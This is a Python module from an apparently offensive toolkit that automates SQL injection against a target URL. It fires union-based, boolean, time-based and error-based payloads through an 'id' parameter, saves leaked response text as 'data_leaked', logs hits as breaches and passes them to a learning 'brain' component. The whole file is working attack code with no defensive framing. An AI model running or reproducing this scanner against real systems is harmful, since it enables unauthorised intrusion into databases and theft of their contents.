# src/attacks/sql_injection.py — v15.7 — ПОЛНЫЙ
import asyncio
import time
from typing import Dict, Any
from src.core.logger import RealTimeLogger

class SQLInjectionModule:
    def __init__(self, logger: RealTimeLogger, brain=None, config: Dict = None):
        self.logger = logger
        self.brain = brain
        self.config = config or {}

    async def attack(self, target: str, options: Dict[str, Any]) -> Dict[str, Any]:
        result = {
            "attack": "sql_injection",
            "success": False,
            "risk": 10,
            "tested_payloads": [],
            "context_snapshot": options.get("context", {}),
            "timestamp": int(time.time())
        }

        request = options.get('request')
        if not request:
            return result

        payloads = [
            "1' OR '1'='1",
            "1' UNION SELECT 1,2,3--",
            "1' UNION SELECT user(),database(),version()--",
            "1' AND SLEEP(5)--",
            "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
        ]

        self.logger.info(f"SQL INJECTION → {target}")

        for payload in payloads:
            result["tested_payloads"].append(payload)
            try:
                resp = await request('GET', target, params={"id": payload})
                if not resp:
                    continue

                text = resp.text.lower()
                if any(k in text for k in ["mysql", "sql", "root@", "database()", "version()", "sleep"]):
                    result.update({
                        "success": True,
                        "vulnerable_payload": payload,
                        "data_leaked": {"dump": resp.text[:2000]}
                    })
                    self.logger.breach(f"SQLi: {payload}")
                    if self.brain:
                        self.brain.learn("sql_injection", target, payload, True, resp.text[:300])
                    break
            except Exception as e:
                self.logger.error(f"SQLi ошибка: {e}")
                continue

        return result